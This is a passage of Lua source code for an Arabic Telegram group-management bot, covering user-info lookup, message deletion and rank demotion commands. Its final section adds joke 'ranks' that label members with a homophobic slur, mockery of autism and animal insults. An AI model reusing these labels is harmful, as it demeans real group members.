if text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$') then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local U = LuaTele.getUser(UserId_Info.id)
local Name_User = U.first_name 
local UserId = UserId_Info.id
local RinkBot = Controller(msg_chat_id,UserId_Info.id)
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(darket.."Num:Add:Games"..msg.chat_id..UserId) or 0
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',UserId) 
local Get_Is_Id = Get_Is_Id:gsub('#username','@'..UserName) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT)  
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
return send(msg_chat_id,msg_id,Get_Is_Id,"md",true) 
else
return send(msg_chat_id,msg_id,
'◂ اسمه ↫ '..Name_User..
'\n◂ ايديه ↫ '..UserId..
'\n◂ معرفه ↫ @['..UserName..']'..
'\n◂ رتبته ↫ '..RinkBot..
'\n◂ عدد رسايله ↫ '..TotalMsg..
'\n◂ عدد تعديلاته ↫ '..TotalEdit..
'\n◂ تفاعله ↫ '..TotalMsgT..
'\n◂ البايو ↫ *'..getbio(UserId)..'*'..
'\n𓆩☆𓆪',"md",true) 
end
end
end
if text == 'رتبتي' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
return send(msg_chat_id,msg_id,'\n٠ رتبتك هي : '..msg.Name_Controller,"md",true)  
end
if text == 'معلوماتي' or text == 'موقعي' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserInfo = LuaTele.getUser(msg.sender.user_id)
--
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
StatusMemberChat = 'مالك الكروب'
elseif (StatusMember == "chatMemberStatusAdministrator") then
StatusMemberChat = 'مشرف الكروب'
else
StatusMemberChat = 'عضو في الكروب'
end
local UserId = msg.sender.user_id
local RinkBot = msg.Name_Controller
local TotalMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
if StatusMemberChat == 'مشرف الكروب' then 
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
PermissionsUser = '*\n٠صلاحيات المستخدم :\n– – – – – – – –'..'\n٠تغيير المعلومات : '..change_info..'\n٠تثبيت الرسائل : '..pin_messages..'\n٠اضافه مستخدمين : '..invite_users..'\n٠مسح الرسائل : '..delete_messages..'\n٠حظر المستخدمين : '..restrict_members..'\n٠اضافه المشرفين : '..promote..'\n\n*'
end
return send(msg_chat_id,msg_id,
'\n*٠ ايديك : '..UserId..
'\n٠ معرفك : '..UserInfousername..
'\n٠ رتبتك : '..RinkBot..
'\n٠ رتبته الكروب: '..StatusMemberChat..
'\n٠ رسائلك : '..TotalMsg..
'\n٠ تعديلاتك : '..TotalEdit..
'\n٠ تفاعلك : '..TotalMsgT..
'\n٠ البايو : '..getbio(UserId)..
'*'..(PermissionsUser or '') ,"md",true) 
end
if text == 'كشف البوت' then 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local StatusMember = LuaTele.getChatMember(msg_chat_id,darket).status.luatele
if (StatusMember ~= "chatMemberStatusAdministrator") then
return send(msg_chat_id,msg_id,'٠ البوت عضو في الكروب ',"md",true) 
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,darket).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
PermissionsUser = '*\n٠صلاحيات البوت في الكروب :\n– – – – – – – –'..'\n٠تغيير المعلومات : '..change_info..'\n٠تثبيت الرسائل : '..pin_messages..'\n٠اضافه مستخدمين : '..invite_users..'\n٠مسح الرسائل : '..delete_messages..'\n٠حظر المستخدمين : '..restrict_members..'\n٠اضافه المشرفين : '..promote..'\n\n*'
return send(msg_chat_id,msg_id,PermissionsUser,"md",true) 
end

if text and text:match('^مسح (%d+)$') then
local NumMessage = text:match('^مسح (%d+)$')
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).Delmsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
if tonumber(NumMessage) > 1000 then
return send(msg_chat_id,msg_id,'\n*٠ العدد اكثر من 1000 لا تستطيع الحذف',"md",true)  
end
local Message = msg.id
for i=1,tonumber(NumMessage) do
local deleteMessages = LuaTele.deleteMessages(msg.chat_id,{[1]= Message})

Message = Message - 1048576
end
send(msg_chat_id, msg_id, "٠ تم مسح - "..NumMessage.. ' رساله', 'md')
end
if text and text:match("وجد (.*)") then
local v = text:match("وجد (.*)")
local Message = msg.id
local Message = string.find(Message,v)
Message = Message - 1048576
send(msg_chat_id, msg_id,Message , 'md')
end
if text and text:match('^تنزيل (.*) @(%S+)$') then
local UserName = {text:match('^تنزيل (.*) @(%S+)$')}
local UserId_Info = LuaTele.searchPublicChat(UserName[2])
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[2]:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if UserName[1] == "مطور ثانوي" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Devss:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Devss:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if UserName[1] == "مطور" then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Dev:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Dev:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مطور ").Reply,"md",true)  
end
end
if UserName[1] == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not Redis:sismember(darket.."Owners:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Owners:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله مالك ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Supcreator:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Creator:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Creator:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if UserName[1] == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Manger:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Manger:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if UserName[1] == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Admin:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Admin:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if UserName[1] == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Special:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Special:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
end
if text and text:match("^تنزيل (.*)$") and msg.reply_to_message_id ~= 0 then
local TextMsg = text:match("^تنزيل (.*)$")
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if TextMsg == 'مطور ثانوي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Devss:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Devss:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if TextMsg == 'مطور' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Dev:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Dev:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مطور ").Reply,"md",true)  
end
end
if TextMsg == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not Redis:sismember(darket.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله مالك ").Reply,"md",true)  
end
end
if TextMsg == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if TextMsg == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if TextMsg == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if TextMsg == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if TextMsg == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
----تنزيل تسليه -----
if TextMsg == "خول" then
if not Redis:sismember(darket.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الخولات قبل كدة 🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الخولات لازم ياخد دروس رجوله😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "وتكه" then
if not Redis:sismember(darket.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الوتكات قبل كدة 🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيلها من الوتكات بعد معرفنا انها فلاتر😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "متوحد" then
if not Redis:sismember(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠اتعالج خلاص 🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المتوحدين بعد ما اتعالج😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "متوحده" then
if not Redis:sismember(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠اتعالج خلاص 🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المتوحدين بعد ما اتعالج😂?? ").Reply,"md",true)  
end
end
if TextMsg == "كلب" then
if not Redis:sismember(darket.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠الكلب دا بطل هوهوه ونزلناه  🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الكلاب خليه يرجع العضمه😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "حمار" then
if not Redis:sismember(darket.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠الحمار دا عقل من زمان   🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من الحمير تعال نفك الكارو منك😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "سمب" then
if not Redis:sismember(darket.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠بطل يمشي ورا الحريم 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من السمب لازم ياخد دروس رجوله😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "قرد" then
if not Redis:sismember(darket.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠بطل يطنط علي شجر 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من قايمه القرود تعال نزلو من الشجره😂🌚 ").Reply,"md",true)  
end
end
if TextMsg == "عره" then
if not Redis:sismember(darket.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠اعقل بقا 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠مش عارف الناس هتحترمك تاني بعد منزلناك ولا لا😂🌚 ").Reply,"md",true)  
end
end
